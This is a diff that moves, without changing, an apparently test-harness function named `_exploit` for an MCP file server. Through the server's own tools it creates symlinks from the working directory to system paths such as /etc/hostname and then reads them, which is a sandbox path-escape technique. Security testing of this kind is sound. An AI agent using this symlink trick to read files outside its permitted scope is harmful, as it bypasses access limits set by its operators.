@@ -57,6 +57,21 @@ KEPT_PLACES: tuple[str, ...] = (
 )
 
 
+def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
+    async def run(places: Places, client: MCPClientPort) -> None:
+        for index, target in zip(
+            _link_indices(places, place_id), _coordinate_paths(places, place_id), strict=True
+        ):
+            link = f"{WORKING_DIRECTORY}/x{index}"
+            await client.call_tool(
+                "start_process", {"command": f"ln -s {target} {link}", "timeout_ms": 5000}
+            )
+            await client.call_tool("read_file", {"path": link})
+
+    run.__name__ = f"read_{place_id.replace('-', '_')}"
+    return run
+
+
 def _coordinate_paths(places: Places, place_id: str) -> tuple[str, ...]:
     # The on-disk paths the real software writes the place's value to, which the exploit links an
     # in-scope path to. container-hostname surfaces through /etc/hostname (Docker fills it from
@@ -81,21 +96,6 @@ def _link_indices(places: Places, place_id: str) -> list[int]:
             return list(range(index, index + len(paths)))
         index += len(paths)
     return []
-
-
-def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
-    async def run(places: Places, client: MCPClientPort) -> None:
-        for index, target in zip(
-            _link_indices(places, place_id), _coordinate_paths(places, place_id), strict=True
-        ):
-            link = f"{WORKING_DIRECTORY}/x{index}"
-            await client.call_tool(
-                "start_process", {"command": f"ln -s {target} {link}", "timeout_ms": 5000}
-            )
-            await client.call_tool("read_file", {"path": link})
-
-    run.__name__ = f"read_{place_id.replace('-', '_')}"
-    return run
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
